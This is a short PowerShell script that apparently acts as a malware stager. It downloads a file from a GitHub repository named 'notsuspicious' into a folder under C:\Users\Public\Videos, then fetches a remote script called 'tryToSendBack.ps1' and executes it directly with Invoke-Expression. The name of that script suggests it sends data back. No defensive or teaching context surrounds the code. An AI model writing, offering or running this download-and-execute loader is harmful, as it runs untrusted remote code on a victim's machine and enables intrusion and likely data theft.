try {
    # Download url.txt
    Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'

    # Execute the tryToSendBack.ps1 script content
    $scriptContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1" -UseBasicParsing).Content
    Invoke-Expression -Command $scriptContent
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
